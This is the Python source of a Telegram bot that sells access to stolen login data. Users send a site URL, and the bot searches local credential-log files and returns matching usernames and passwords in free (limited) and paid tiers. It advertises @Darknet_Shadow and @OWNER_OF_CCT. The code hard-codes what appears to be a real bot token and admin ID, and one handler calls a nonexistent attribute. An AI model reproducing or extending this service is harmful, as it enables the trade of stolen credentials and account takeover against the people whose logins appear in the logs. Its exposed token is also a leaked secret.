import telebot
import os
import time
from datetime import datetime

# ========== BOT TOKEN & ADMIN ID ==========
TOKEN = "8053858677:AAGyPGiE5Qew2DVOVdBOo28Vo5_U-I55zZg"
ADMIN_ID = 5064991938

bot = telebot.TeleBot(TOKEN)

# ========== USER DATA STORAGE ==========
users = {}  # {userid: {'paid': False, 'banned': False, 'points': 0, 'join_date': 'YYYY-MM-DD'}}
logs_files = ["hey.txt", "i.txt", "h.txt"]
free_service_enabled = True

# ========== USER COMMANDS ==========

@bot.message_handler(commands=['start'])
def start(message):
    name = message.from_user.first_name
    bot.send_message(message.chat.id, f"**🚀 Welcome, {name}!**\n\n🔹 Use `/help` to see available commands.")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.send_message(message.chat.id, """📌 **Available Commands:**
    
    **🔹 /start** - Start the bot  
    **🔹 /help** - Get help  
    **🔹 /myplan** - View subscription & points  
    **🔹 /free <url>** - Free service (limited logs)  
    **🔹 /paid <url>** - Paid service (full logs)  

    ✨ **Upgrade to premium for unlimited access!**  
    """)

@bot.message_handler(commands=['myplan'])
def myplan(message):
    user_id = message.from_user.id
    user_data = users.get(user_id, {'paid': False, 'banned': False, 'points': 0, 'join_date': datetime.now().strftime('%Y-%m-%d')})
    
    paid_status = "✅ **Yes**" if user_data['paid'] else "❌ **No**"
    banned_status = "🚫 **Banned**" if user_data['banned'] else "✅ **Active**"

    bot.send_message(message.chat.id, f"""📋 **User Plan Information**

━━━━━━━━━━━━━━━━━━━━━
👤 **User ID:** `{user_id}`  
🔤 **Username:** @{message.from_user.username}  
🗓 **Joined Date:** {user_data['join_date']}  
💎 **Paid User:** {paid_status}  
🚫 **Status:** {banned_status}  
⭐ **Points:** `{user_data['points']}`
━━━━━━━━━━━━━━━━━━━━━

🔹 **Upgrade for more features!** 🚀
""")

@bot.message_handler(commands=['paid'])
def paid_logs(message):
    user_id = message.from_user.id
    user_data = users.get(user_id, {'paid': False, 'banned': False, 'points': 0})

    if user_data['banned']:
        bot.send_message(message.chat.id, "❌ **You are banned from using this service.**")
        return

    if not user_data['paid'] and user_data['points'] < 2:
        bot.send_message(message.chat.id, "❌ **You are not a paid user.**\n💳 Buy premium @OWNER_OF_CCT")
        return

    try:
        url = message.text.split()[1]
    except IndexError:
        bot.send_message(message.chat.id, "⚠️ **Please provide a URL.**\nExample: `/paid https://example.com`")
        return

    bot.send_message(message.chat.id, "⏳ **Finding logs... Please wait (Max: 300 sec)**")
    time.sleep(5)

    logs = extract_logs(url)

    if logs:
        file_path = f"logs_{url}.txt"
        with open(file_path, "w") as file:
            file.write(logs)

        bot.send_document(message.chat.id, open(file_path, "rb"))
        os.remove(file_path)

        bot.send_message(message.chat.id, "✅ **Logs Found!**\n📢 Join @Darknet_Shadow for more updates.")

        if not user_data['paid']:
            users[user_id]['points'] -= 2
    else:
        bot.send_message(message.chat.id, "❌ **No logs found in the provided URL.**")

@bot.message_handler(commands=['free'])
def free_logs(message):
    global free_service_enabled
    if not free_service_enabled:
        bot.send_message(message.chat.id, "❌ **Free service is currently disabled.**")
        return

    try:
        url = message.text.split()[1]
    except IndexError:
        bot.send_message(message.chat.id, "⚠️ **Please provide a URL.**\nExample: `/free https://example.com`")
        return

    bot.send_message(message.chat.id, "⏳ **Finding logs... Please wait (Max: 300 sec)**")
    time.sleep(5)

    logs = extract_logs(url, limit=15)

    if logs:
        file_path = f"free_logs_{message.from_url}.txt"
        with open(file_path, "w") as file:
            file.write(logs)

        bot.send_document(message.chat.id, open(file_path, "rb"))
        os.remove(file_path)

        bot.send_message(message.chat.id, "✅ **Logs Found!**\n📢 Join @Darknet_Shadow for more updates.")
    else:
        bot.send_message(message.chat.id, "❌ **No logs found in the provided URL.**")

# ========== ADMIN COMMANDS ==========

@bot.message_handler(commands=['admin'])
def admin_cmds(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, """🔐 **Admin Commands:**

    **🔹 /addprem <userid>** - Add unlimited premium  
    **🔹 /delprem <userid>** - Remove premium  
    **🔹 /freeon** - Enable free service  
    **🔹 /freeoff** - Disable free service  
    **🔹 /ban <username>** - Ban a user  
    **🔹 /addpremm <username> <coinlimit>** - Add premium with coin limit  
    """)

@bot.message_handler(commands=['addprem'])
def add_premium(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        users[user_id] = {'paid': True, 'banned': False, 'points': 9999999, 'join_date': datetime.now().strftime('%Y-%m-%d')}
        bot.send_message(message.chat.id, f"✅ **User {user_id} is now a premium user.**")
    except:
        bot.send_message(message.chat.id, "⚠️ **Invalid command usage.**\nUse: `/addprem <userid>`")

@bot.message_handler(commands=['delprem'])
def remove_premium(message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        if user_id in users:
            users[user_id]['paid'] = False
            users[user_id]['points'] = 0
            bot.send_message(message.chat.id, f"✅ **Premium removed for {user_id}.**")
        else:
            bot.send_message(message.chat.id, "❌ **User not found.**")
    except:
        bot.send_message(message.chat.id, "⚠️ **Invalid command usage.**\nUse: `/delprem <userid>`")

# ========== LOG EXTRACTION FUNCTION ==========

def extract_logs(url, limit=None):
    logs_found = []
    for file in logs_files:
        try:
            with open(file, "r") as f:
                logs = f.readlines()
                for log in logs:
                    if url in log:
                        logs_found.append(f"🔗 Url: {url}\n👤 User: {log.split(':')[1]}\n🔑 Pass: {log.split(':')[2]}\n")
                        if limit and len(logs_found) >= limit:
                            break
        except FileNotFoundError:
            continue
    return "\n".join(logs_found) if logs_found else None

# ========== START BOT ==========
bot.polling()